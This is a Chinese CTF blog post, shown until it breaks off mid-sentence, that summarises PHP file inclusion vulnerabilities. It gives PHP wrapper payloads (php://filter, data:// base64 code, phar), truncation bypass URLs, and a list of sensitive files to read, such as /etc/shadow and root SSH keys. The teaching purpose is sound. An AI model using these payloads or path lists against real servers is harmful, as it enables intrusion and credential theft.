<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="P1kap1" href="https://p1kap1.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="P1kap1" href="https://p1kap1.github.io/atom.xml"><link rel="alternate" type="application/json" title="P1kap1" href="https://p1kap1.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="文件包含"><link rel="canonical" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><title>ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">ctf文件包含总结</h1><div class="meta"><span class="item" title="创建时间：2024-01-02 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2024-01-02T00:00:00+08:00">2024-01-02</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Clear Mind</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/covers/file.png"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/knowledge/" itemprop="item" rel="index" title="分类于 杂谈小记"><span itemprop="name">杂谈小记</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://p1kap1.github.io/knowledge/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="p1kap1"><meta itemprop="description" content="东隅已逝，桑榆非晚, 明镜止水之心"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="P1kap1"></span><div class="body md" itemprop="articleBody"><h1 id="文件包含漏洞"><a class="anchor" href="#文件包含漏洞">#</a> 文件包含漏洞</h1><h2 id="前言"><a class="anchor" href="#前言">#</a> 前言</h2><p>目前 ctf 比赛也打过不少了，也遇到过不少知识点，知识广度是有的，但是这样一直前进下去，前期可能感觉没什么，越往后我越能发现一个弊端，就是知识太散了，散到如一盘沙砾，每次想要抓住只能抓住部分。</p><p>正好昨天打了以下 ctfshow 平台的元旦水友赛，第一道就是文件包含，在利用 file://localhost/etc/hosts 的方式，来绕过开头必须是字母的限制后我想到很多种包含方式，比如日志文件包含，远程文件包含啥的，但其实这道题的考点是裸文件包含，但当时的我在尝试前面两种方法无果后，并没有立即反应过来。这让我羞恼之际下一瞬间手脚冰凉，浑身不由颤动起来，只觉得这大冷天心更冷了。</p><p>裸文件包含的题目我并不是没有写过，但它的利用环境我却始终没有注意过，也正是这个原因让我第一时间没有反应过来。再三反省后，随后便是释然，这何尝不是题目的一种考察方式，真实的渗透测试环境下可不会让你这么简单就看穿漏洞，连一刻也没有为为这次经历而失落，下面进行的是对文件包含漏洞的总结，同时也是我 2024 年的第一篇博客，以此来纪念那个 2023 年不知所措但又知其所向的我。</p><h2 id="文件包含漏洞基础知识"><a class="anchor" href="#文件包含漏洞基础知识">#</a> 文件包含漏洞基础知识</h2><p>本篇文章是记录我打 CTF 比赛中的一些文件包含漏洞利用经验（由于比赛大部分是 PHP 的文件包含，所以这里是以 PHP 的文件包含为案例来写的，其他语言的文件包含类似）。</p><p>老生常谈的问题</p><h3 id="文件包含漏洞是什么"><a class="anchor" href="#文件包含漏洞是什么">#</a> 文件包含漏洞是什么？</h3><p>其实我一直觉得概念这种抽象的东西其实很难用一小段简短的语言来描述，你很难让每个人都对这个概述认可，所以写的不好的地方还请多多包含。</p><p>这里我从两个角度来说明：</p><blockquote><p>后端编程人员一般会把重复使用的函数写到单个文件中，需要使用时再直接调用文件即可，该过程称为文件包含。但是这样做也带来许多安全问题。比如一般情况下会采用变量的形式来传递需要包含的文件，但是在使用包含文件的过程中，未对包含的变量进行检查及过滤，这就使得假如客户端可以控制这个变量传入的值，可以通过提交恶意的数据作为变量进入到了文件包含的过程中，从而导致提交的恶意数据被执行。</p></blockquote><h3 id="一般会使用以下函数来进行文件包含"><a class="anchor" href="#一般会使用以下函数来进行文件包含">#</a> 一般会使用以下函数来进行文件包含：</h3><table><thead><tr><th style="text-align:center">require()</th><th style="text-align:center">找不到被包含的文件会产生致命错误，并停止脚本执行</th></tr></thead><tbody><tr><td style="text-align:center">include()</td><td style="text-align:center">找不到被包含的文件只会产生警告，脚本继续执行</td></tr><tr><td style="text-align:center">require_once()</td><td style="text-align:center">与 require () 类似，唯一的区别是如果该文件的代码已经被包含，则不会再次包含</td></tr><tr><td style="text-align:center">include_once()</td><td style="text-align:center">与 include () 类似，唯一的区别是如果该文件的代码已经被包含，则不会再次包含</td></tr></tbody></table><p>（比较常见的还有这些函数： <code>highlight_file()</code> 、 <code>show_source()</code> 、 <code>readfile()</code> 、 <code>file_get_contents()</code> 、 <code>fopen()</code> 、 <code>file()</code> ）</p><p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt 等等），都会直接作为 php 文件进行解析。</p><p>PHP 内置了很多 URL 风格的封装协议，可用于类似 fopen ()、copy ()、file_exists () 和 filesize () 的文件系统函数</p><p>所以在文件包含中，php 伪协议有着至关重要的作用。</p><h3 id="一张表了解php的伪协议"><a class="anchor" href="#一张表了解php的伪协议">#</a> 一张表了解 php 的伪协议：</h3><table><thead><tr><th style="text-align:center">协议</th><th style="text-align:center">测试 php 版本</th><th style="text-align:center">allow_url_fopen</th><th style="text-align:center">allow_url_include</th><th>用法</th></tr></thead><tbody><tr><td style="text-align:center">file://</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">off/on</td><td>?file=file:///etc/passwd</td></tr><tr><td style="text-align:center">php://filter</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">off/on</td><td>?file=php://filter/read=convert.base64-encode/resource=./index.php</td></tr><tr><td style="text-align:center">php://input</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">on</td><td>?file=php://input POST DATA</td></tr><tr><td style="text-align:center">zip://</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">off/on</td><td>?file=zip:///tmp/1.zip%231.txt</td></tr><tr><td style="text-align:center">compress.bzip2://</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">off/on</td><td>?file=compress.bzip2://./file.bz2</td></tr><tr><td style="text-align:center">compress.zlib://</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">off/on</td><td>?file=compress.zlib://./file.gz</td></tr><tr><td style="text-align:center">data://</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">on</td><td style="text-align:center">on</td><td>?file=data://text/plain, or ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== or ?file=data:text/plain, or ?file=data.text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</td></tr><tr><td style="text-align:center">phar://</td><td style="text-align:center">&gt;=5.2</td><td style="text-align:center">off/on</td><td style="text-align:center">off/on</td><td>?file=phar://php.zip/php.jpg</td></tr></tbody></table><blockquote><ol><li>allow_url_fopen: 这个选项允许 PHP 通过网络协议（例如 <code>http://</code> 或 <code>ftp://</code> ）打开远程文件。当 <code>allow_url_fopen</code> 被设置为 <code>On</code> 时，PHP 的文件处理函数（如 <code>file_get_contents()</code> 和 <code>fopen()</code> ）可以使用 URL 来访问网络上的资源。这可以让你的脚本从其他服务器上获取数据，但是同时也可能带来安全风险，因为不安全的使用可能会导致代码注入攻击。</li><li>allow_url_include: 这个选项与 <code>allow_url_fopen</code> 类似，但它是专门针对 PHP <code>include</code> 和 <code>require</code> 语句的。当 <code>allow_url_include</code> 设置为 <code>On</code> 时，这两个语句可以使用 URL 来包含远程文件作为 PHP 代码执行。这更加危险，因为它允许执行远程服务器上的 PHP 代码，这可能导致严重的安全漏洞，如远程文件包含（Remote File Inclusion, RFI）攻击。</li></ol></blockquote><h3 id="各个协议详解"><a class="anchor" href="#各个协议详解">#</a> 各个协议详解</h3><blockquote><p>file 协议<br>可在 allow_url_fopen ：off/on allow_url_include：off/on 下均可使用，但是必须要用绝对路径，而且可以读取文件，当然文件内容不能是 php 代码形式（这点要切记，非常容易犯错）否则会被直接解析。如果不是 php 代码的内容会被直接显示出来。</p></blockquote><blockquote><p>php:// 协议<br>条件：<br>不需要开启 allow_url_fopen，仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。<br>1、php://filter 不需要 allow_url 开启即可读取、包含。PHP 代码读取需要编码否则直接执行 php 代码（很重要）<br>2、常用来读取代码的包含命令 php://filter/read=convert.base64-encode/resource=./cmd.php<br>3、php://input 需要 allow_url_include:on<br>4、当 allow_url_include 为 On，而 allow_url_fopen 为 Off 的时候，不可以直接远程包含文件，但是可以使用 php://input、 php://stdin、 php://memory 和 php://temp 等伪协议<br>5、利用 php 的数据协议 data:// 可以查看文件源代码，前提是 php.ini 中的 allow_url_fopen 和 allow_url_include 两个配置为 on</p></blockquote><blockquote><p>zip 协议<br>zip://, bzip2://, zlib:// 协议在 allow_url 双 off 的情况下都可以正常使用；</p><p>zip 协议：php5.2.x 需要绝对路径 其他版本可以相对路径 windows 复现成功了<br>包含例子：zip://1.png%231.php 或者 zip://1.zip%231.php</p></blockquote><blockquote><p>phar 协议<br>allow 两个都为 ON 并且 PHP 版本高于 5.3<br>例子：<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS9maWxlLnBocD9maWxlPXBoYXI6Ly9waGFydGVzdDIuemlwL2EuanBn">http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg</span> 和 zip 伪协议是一样的用法<br>生成 phar 打包代码：</p></blockquote><pre><code>&lt;?php
$p = new PharData(dirname(__FILE__).'/phartest2.zip', 0,'phartest2',Phar::ZIP) ;
$x=file_get_contents('./php.php');
$p-&gt;addFromString('a.jpg',$x);
//会生成一个zip的压缩文件phartest2.zip 其中压缩了一个a.jpg a.jpg里面代码是php.php的内容
//当然和zip协议一样，你也可以把phartest2.zip改成任意后缀，这里的后缀和包含读取是没有关系的。怎么绕过白名单方便就怎么来
//然后我们构造http://127.0.0.1/file.php?file=phar://phartest2.zip/a.jpg
//也可以直接shell
//其中phar适用范围为php&gt;5.3.0
?&gt;
</code></pre><blockquote><p>data: 协议<br>allow_url 两个都需要 On (没用，都为 on 我直接就去 php://input getshell 了)<br>例子：data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg （phpinfo)</p></blockquote><p>伪协议不止用在文件包含中，所有和文件有关的操作都可以进行伪协议的利用，例如以下函数均可支持伪协议：</p><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>file_get_<span class="token function">contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">copy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>parse_ini_<span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>file_put_<span class="token function">contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token function">tempnam</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token function">touch</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>move_uploaded_<span class="token function">file</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">rename</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>require_<span class="token function">once</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>include_<span class="token function">once</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token property">ZipArchive</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="对于文件包含的分类有个笼统的分类"><a class="anchor" href="#对于文件包含的分类有个笼统的分类">#</a> 对于文件包含的分类有个笼统的分类：</h3><p>本地文件包含 (Loacl File Inclusion,LFI) 和远程文件包含 (Remote File Inclusion,RFI)。</p><p>下面我将对两种包含形式进行详细介绍。</p><h2 id="本地文件包含"><a class="anchor" href="#本地文件包含">#</a> 本地文件包含</h2><p>本地文件包含就是通过浏览器包含 web 服务器上的文件，这种漏洞是因为浏览器包含文件时没有进行严格的过滤允许遍历目录的字符注入浏览器并执行。</p><p>首先，当值可以直接被控制时，你就会有一个非常类似的如下的代码片段。</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>这时候你就可以利用伪协议随意地对该服务器上的文件进行读取了，你可以使用绝对路径直接读取，也可以使用相对路径读取，通过./ 表示当前文件位置，../ 表示上一级路径位置。</p><p>这时候知道一些敏感文件的路径就至关重要了，有时候你不知道包含什么就可试试以下路径，说不定有奇效。</p><h3 id="敏感文件路径"><a class="anchor" href="#敏感文件路径">#</a> 敏感文件路径</h3><figure class="highlight scss"><figcaption data-lang="Sass (Scss)"></figcaption><table><tr><td data-num="1"></td><td><pre>日志路径</pre></td></tr><tr><td data-num="2"></td><td><pre>/logs/access.log     #windows apache</pre></td></tr><tr><td data-num="3"></td><td><pre>/logs/error.log      #windows apache</pre></td></tr><tr><td data-num="4"></td><td><pre>/var/log/apache/error.log     #Apache</pre></td></tr><tr><td data-num="5"></td><td><pre>/var/log/apache/access_log   #Apache</pre></td></tr><tr><td data-num="6"></td><td><pre>/var/www/logs/access_log    #Apache</pre></td></tr><tr><td data-num="7"></td><td><pre>/var/log/asscess_log       #Apache</pre></td></tr><tr><td data-num="8"></td><td><pre>/var/log/access.log       #Apache</pre></td></tr><tr><td data-num="9"></td><td><pre>/usr/local/apache/logs/error_log</pre></td></tr><tr><td data-num="10"></td><td><pre>/usr/local/apache/logs/access_log</pre></td></tr><tr><td data-num="11"></td><td><pre>/etc/httpd/logs/access_log    #Apache</pre></td></tr><tr><td data-num="12"></td><td><pre>/var/log/nginx/access.log或者error.log   #Nginx</pre></td></tr><tr><td data-num="13"></td><td><pre>/logs/access.log或者error.log     #windows Nginx</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token property">C</span><span class="token punctuation">:</span>\windows\system32\LogFiles   #iis6.0版本</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token placeholder selector">%SystemDrive</span>%\inetpub\logs\LogFiles #iis7.5版本</pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>session 路径</pre></td></tr><tr><td data-num="18"></td><td><pre>/tmp/sess_phpsession_id</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>敏感信息路径</pre></td></tr><tr><td data-num="21"></td><td><pre>windows</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\boot.ini  #查看系统版本</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\Windows\System32\inetsrv\MetaBase.xml #IIS配置文件</pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\Windows\repair\sam  #存储系统初次安装密码</pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\Windows\php.ini  #php配置信息</pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\Windows\my.ini  #mysql配置信息</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\Program Files\mysql\my.ini</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token property">c</span><span class="token punctuation">:</span>\Program Files\mysql\data\mysql\user.MYD #mysql root</pre></td></tr><tr><td data-num="29"></td><td><pre>phpstudy的各种路径具体分析</pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>linux</pre></td></tr><tr><td data-num="32"></td><td><pre>/root/.ssh/authorized_keys</pre></td></tr><tr><td data-num="33"></td><td><pre>/root/.ssh/id_rsa</pre></td></tr><tr><td data-num="34"></td><td><pre>/root/.ssh/id_rsa.keystore</pre></td></tr><tr><td data-num="35"></td><td><pre>/root/.ssh/known_hosts</pre></td></tr><tr><td data-num="36"></td><td><pre>/etc/passwd                #账户信息</pre></td></tr><tr><td data-num="37"></td><td><pre>/etc/shadow                #账户密码信息</pre></td></tr><tr><td data-num="38"></td><td><pre>/etc/my.cnf</pre></td></tr><tr><td data-num="39"></td><td><pre>/root/httpd/conf/httpd.conf</pre></td></tr><tr><td data-num="40"></td><td><pre>/root/.bash_history</pre></td></tr><tr><td data-num="41"></td><td><pre>/root/.mysql_history</pre></td></tr><tr><td data-num="42"></td><td><pre>/proc/self/fd/fd[0-9]*</pre></td></tr><tr><td data-num="43"></td><td><pre>/proc/mounts</pre></td></tr><tr><td data-num="44"></td><td><pre>/proc/config.gz</pre></td></tr><tr><td data-num="45"></td><td><pre>/usr/local/app/apache2/conf/httpd.conf #Apache2默认配置文件</pre></td></tr><tr><td data-num="46"></td><td><pre>/usr/local/app/apache2/conf/extra/httpd-vhost.conf #虚拟网站配置</pre></td></tr><tr><td data-num="47"></td><td><pre>/usr/local/app/php5/lib/php.ini     #PHP相关配置</pre></td></tr><tr><td data-num="48"></td><td><pre>/etc/httpd/conf/httpd.conf          #Apache配置文件</pre></td></tr><tr><td data-num="49"></td><td><pre>/proc/self/cmdline</pre></td></tr><tr><td data-num="50"></td><td><pre>/proc/self/environ</pre></td></tr><tr><td data-num="51"></td><td><pre>/etc/apache2/apache2.conf        #ubuntu 下配置文件</pre></td></tr><tr><td data-num="52"></td><td><pre>/etc/my.conf                     # MySQL 配置文件</pre></td></tr><tr><td data-num="53"></td><td><pre>/etc/nginx/nginx.conf            #Nginx配置文件</pre></td></tr></table></figure><p>接下来正式开始记录目前 CTF 比赛中文件包含考察的几种形式</p><h3 id="伪协议读文件"><a class="anchor" href="#伪协议读文件">#</a> 伪协议读文件</h3><p>这种是最直白的，也是下面几种文件包含利用的基础，</p><p>普遍用伪协议读文件都是转成 base64 的 Steam：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.base64-encode/resource=</span></pre></td></tr></table></figure><p>当然也有 <code>string.rot13</code> 之类的，但是如果 <code>string</code> <code>base</code> 关键字不能用的情况下，还可以用 iconv 转编码，例如：</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.iconv.ASCII.UCS-2BE/resource=index.php</span></pre></td></tr><tr><td data-num="2"></td><td><pre>php<span class="token punctuation">:</span><span class="token comment">//filter/convert.iconv.utf-8.utf-7/resource=index.php</span></pre></td></tr></table></figure><p>至于 php 的 iconv 都能用哪些编码，可以从<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvdG9vbHMvYmxvZy1lbnRyeT90YXJnZXQ9aHR0cHMlM0ElMkYlMkZ3d3cucGhwLm5ldCUyRm1hbnVhbCUyRmVuJTJGbWJzdHJpbmcuc3VwcG9ydGVkLWVuY29kaW5ncy5waHAmYW1wO3NvdXJjZT1hcnRpY2xlJmFtcDtvYmplY3RJZD0yMTQ1MTYw"> PHP 官网</span>查看，挑两个编码用一下就行了。</p><p>实在不行就研究一下这篇文章：</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDkzMDAzMzU=">php://filter 的各种过滤器</span></p><p>除此之外，还可以利用 <code>include</code> 函数解 urlencode 的特性来编码绕过。</p><p>当然做题目不可能让你就这么一帆风顺，总会给你上强度。</p><p>于是在题目中往往会添加诸多一些限制，比如为文件指定了特定的前缀或者拓展名，攻击者必须要对前缀或者拓展名过滤，才能达到利用文件</p><h4 id="常见的过滤绕过方式有三种"><a class="anchor" href="#常见的过滤绕过方式有三种">#</a> 常见的过滤绕过方式有三种：</h4><blockquote><ul><li>%00 截断文件包含</li><li>路径长度截断包含</li><li>点好截断文件包含</li></ul></blockquote><h4 id="00截断文件包含"><a class="anchor" href="#00截断文件包含">#</a> %00 截断文件包含</h4><p>利用条件</p><blockquote><p>这个漏洞的使用必须满足如下条件</p><ul><li>magic_quotes_gpc=off</li><li>PHP 版本低于 5.3.4</li></ul></blockquote><p>示例代码</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>测试结果</p><p>输入以下测试代码：<br><code>http://www.abc.com/xxx/file.php?file=../../../../../../boot.ini%00</code><br>通过 %00 截断了后面的 html 拓展名过滤，成功读取了 boot.ini 的内容</p><h4 id="路径长度截断文件包含"><a class="anchor" href="#路径长度截断文件包含">#</a> 路径长度截断文件包含</h4><p>操作系统存在着最大路径长度的限制。可以输入超过最大路劲长度的目录，这样系统就会将后面的路劲丢弃，导致拓展名截断。</p><blockquote><p>漏洞利用条件</p><ul><li>Windows 下最大路径长度为 256B</li><li>Linux 下最大路径长度为 4096B</li></ul></blockquote><p>示例代码</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><h5 id="测试结果"><a class="anchor" href="#测试结果">#</a> 测试结果</h5><p>输入测试以下代码：</p><figure class="highlight cmake"><figcaption data-lang="CMake"></figcaption><table><tr><td data-num="1"></td><td><pre>http://www.abc.com/xxx/file.php?file=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</pre></td></tr></table></figure><p>执行后发现已经成功截断了后面的拓展名</p><h4 id="点号截断文件包含"><a class="anchor" href="#点号截断文件包含">#</a> 点号截断文件包含</h4><p>漏洞利用条件</p><p>点号截断包含只使用与 Windows 系统，点号的长度大于 256B 的时候，就可以造成拓展名截断</p><p>示例代码</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	<span class="token keyword">include</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><p>测试结果</p><figure class="highlight cmake"><figcaption data-lang="CMake"></figcaption><table><tr><td data-num="1"></td><td><pre>http://www.abc.com/xxx/file.php?file=test.txt.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</pre></td></tr></table></figure><p>发现已经成功截断了 html 拓展名</p><h3 id="裸文件包含"><a class="anchor" href="#裸文件包含">#</a> 裸文件包含</h3><p>这种文件包含方式也就是那道坏我道心题目的知识点，原理我就不过多赘述了，直接看 p 